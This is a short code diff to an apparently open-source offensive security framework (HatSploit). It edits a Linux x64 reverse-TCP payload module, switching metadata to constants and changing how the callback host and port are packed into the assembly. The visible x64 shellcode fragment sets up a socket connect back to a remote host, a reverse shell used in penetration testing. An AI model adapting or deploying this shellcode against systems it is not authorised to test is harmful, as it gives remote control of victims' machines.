@@ -23,8 +23,8 @@ class HatSploitPayload(Payload, Handler, Pwny, Assembler, ELF):
                 'Ivan Nikolsky (enty8080) - payload developer'
             ],
             'Description': "Linux x64 Pwny Reverse TCP",
-            'Arch': "x64",
-            'Platform': "linux",
+            'Arch': ARCH_X64,
+            'Platform': OS_LINUX,
             'Session': PwnySession,
             'Rank': "high",
             'Type': "reverse_tcp"
@@ -89,9 +89,6 @@ class HatSploitPayload(Payload, Handler, Pwny, Assembler, ELF):
         )
 
     def run(self):
-        host = self.pack_host(self.rhost.value)
-        port = self.pack_port(self.rport.value)
-
         return self.assemble(
             self.details['Arch'],
             f"""
@@ -106,7 +103,7 @@ class HatSploitPayload(Payload, Handler, Pwny, Assembler, ELF):
                 syscall
 
                 xchg rdi, rax
-                movabs rcx, 0x{host.hex()}{port.hex()}0002
+                movabs rcx, 0x{self.rhost.little.hex()}{self.rport.little.hex()}0002
                 push rcx
                 mov rsi, rsp
                 push 0x10
